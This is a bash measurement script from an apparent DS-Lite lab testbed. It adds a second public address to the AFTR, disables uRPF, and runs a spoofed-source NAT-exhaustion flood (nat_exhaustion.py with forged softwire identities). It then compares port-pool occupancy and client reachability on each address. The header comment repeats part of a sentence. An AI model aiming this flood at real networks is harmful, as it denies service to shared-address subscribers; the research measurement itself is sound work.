#!/bin/bash
# measure_pool_split.sh - integrated per-address NAT-pool measurement for the
# Blast-Radius separation (paper Section sec:aps-experiment). Runs the AFTR with
# TWO public IPv4 addresses (B4-1 subscriber LAN -> 192.0.2.1, B4-2 -> 192.0.2.2)
# and floods the identity-multiplication attack (T12) so it egresses on the FIRST
# address, then counts the NAT-pool occupancy on each address. It shows the flood
# fills only the first address's 64512-port pool while the second stays at 0, so
# the flood fills only the first address's 64512-port pool while the second
# carries only its own subscriber's traffic, so the denial reaches only the
# co-residents sharing the flooded address (Shared-IPv4), strictly smaller than
# AFTR-Wide.
#   docker exec ds-lite-lab bash /testbed/scripts/measure_pool_split.sh
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=attack_lib.sh
source "$HERE/attack_lib.sh"
DPORT=80
NFT_DEFAULT=/testbed/aftr/nftables.conf
NFT_2IP=/testbed/aftr/nftables_2ip.conf

resolve_runtime 2>/dev/null || true
reset_state >/dev/null 2>&1
urpf off; ensure_attacker_isp

# per-address pool occupancy: flood bindings to SRV:DPORT SNATed to 192.0.2.$1
pool_on() { nse aftr conntrack -L 2>/dev/null | grep "dport=$DPORT " | grep -c "dst=192.0.2.$1"; }

echo "================================================================"
echo "  Per-address NAT-pool split under T12 (two public IPv4 on the AFTR)"
echo "================================================================"
nse aftr ip addr add 192.0.2.2/24 dev eth-wan 2>/dev/null
nse aftr nft -f "$NFT_2IP" 2>/dev/null
nse aftr conntrack -F >/dev/null 2>&1
b1=$(httpc client1 "http://$SRV/"); b2=$(httpc client2 "http://$SRV/")
echo "  baseline  client1(->.1)=$b1  client2(->.2)=$b2   pool.1=$(pool_on 1)  pool.2=$(pool_on 2)"

echo "  flooding T12 (forged softwire identities, inner src in B4-1 LAN -> egress .1) ..."
cmd="python3 $T/nat/nat_exhaustion.py eth-isp --tunnel --src-ip6-prefix ${C_PREFIX}:dead::/64 --fixed-dport $DPORT --proto tcp --dst-ip4 $SRV --aftr-ip6 $AFTR --inner-src-prefix 10.0.1.0/24 --threads 8 --batch 256"
nse attacker sh -c "timeout 32 $cmd >/dev/null 2>&1" &
sleep 15
p1=$(pool_on 1); p2=$(pool_on 2)
cN1=$(httpc client1 "http://$SRV/"); cN2=$(httpc client2 "http://$SRV/")
nse attacker pkill -9 -f nat_exhaustion 2>/dev/null

echo
echo "  ---------------- per-address pool split (T12) ----------------"
printf '  first  address 192.0.2.1 pool = %-6s (flooded)\n' "$p1"
printf '  second address 192.0.2.2 pool = %-6s (untouched)\n' "$p2"
printf '  co-resident on .1 (client1) = %s    co-resident on .2 (client2) = %s\n' "$cN1" "$cN2"
if [ "${p1:-0}" -gt 40000 ] && [ "${p2:-1}" -le 1 ] && [ "${cN2:-000}" = "200" ]; then
    echo "  => Shared-IPv4 (cohort on 192.0.2.1) strictly smaller than AFTR-Wide  [OK]"
else
    echo "  => check numbers above"
fi
echo "  --------------------------------------------------------------"

# restore single-address default
nse aftr conntrack -F >/dev/null 2>&1
nse aftr nft -f "$NFT_DEFAULT" 2>/dev/null
nse aftr ip addr del 192.0.2.2/24 dev eth-wan 2>/dev/null
urpf on; reset_state >/dev/null 2>&1
